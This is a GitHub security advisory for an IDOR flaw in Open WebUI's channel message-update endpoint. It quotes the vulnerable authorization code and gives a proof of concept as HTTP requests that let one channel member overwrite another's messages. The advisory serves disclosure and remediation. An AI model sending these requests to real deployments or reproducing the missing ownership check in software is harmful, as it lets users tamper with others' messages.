# [M] Open WebUI has an IDOR vulnerability in the update_message_by_id API endpoint

## Summary
Severity: Medium
Advisory: GHSA-wwhq-cx22-f7vv
CVE: CVE-2026-45385
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-wwhq-cx22-f7vv
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
### Summary
An IDOR vulnerability exists in the Channels feature of `Open WebUI`, allowing any channel member to modify messages sent by other members (including administrators) within the same channel. This vulnerability affects the latest version (`v0.8.12`) of `Open WebUI`.

### Details
In the `update_message_by_id` function, for `group` or `dm` type channels, only the caller's membership in the channel is checked via the `is_user_channel_member` function, without verifying message ownership. This allows any channel member to modify messages sent by other members within the same channel. The problematic code is as follows [(https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355)](https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355) :

```python
if channel.type in ['group', 'dm']:
    if not Channels.is_user_channel_member(channel.id, user.id, db=db):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())
else:
    if (
        user.role != 'admin'
        and message.user_id != user.id
        and not channel_has_access(user.id, channel, permission='write', strict=False, db=db)
    ):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())

try:
    message = Messages.update_message_by_id(message_id, form_data, db=db)
```

Non-group/dm types include a check for the user ID, while the `group/dm` type clearly lacks this verification.

### PoC
The `Channels` feature is disabled by default and can be enabled first through the `admin` interface.
<img width="1024" height="618" alt="image" src="https://github.com/user-attachments/assets/a36502e9-c6cd-41cd-a69c-8b6ac809768f" />

Create a `group` type channel with members including users `test1` and `test2`.

```
POST /api/v1/channels/create HTTP/1.1
Content-Type: application/json

{
  "name": "idor-test-group",
  "type": "group",
  "user_ids": [
    "cfc3cb19-9e92-4bf7-8b72-1b47fe4ff62c",
    "b9997496-ff80-4c30-a366-95474f85e62b"
  ]
}
```

User `test2` sends a message in the channel.

```
POST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/post HTTP/1.1
Content-Type: application/json
Authorization: Bearer <test2_token>

{"content":"This is test2 secret message"}
```

User `test1` can directly modify the message that `test2` just sent.

```
POST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/e0824c09-5712-4400-9b7a-b08eefcf15d3/update HTTP/1.1
Content-Type: application/json
Authorization: Bearer <test1_token>

{"content":"HACKED BY TEST1 - message tampered!"}
```
<img width="1024" height="216" alt="image" src="https://github.com/user-attachments/assets/77646d01-d501-4732-ac37-3ffb69f9f01f" />

Messages sent by administrators can also be modified.

<img width="1024" height="419" alt="image" src="https://github.com/user-attachments/assets/b32dc5eb-f810-41d3-b358-f000d8331761" />


### Impact
Malicious users can arbitrarily tamper with messages published by other users (including administrators), allowing them to disseminate false information.

### Suggested Fix
Add a message ownership check in the `group/dm` branch of `channels.py`.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-wwhq-cx22-f7vv
- https://nvd.nist.gov/vuln/detail/CVE-2026-45385
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
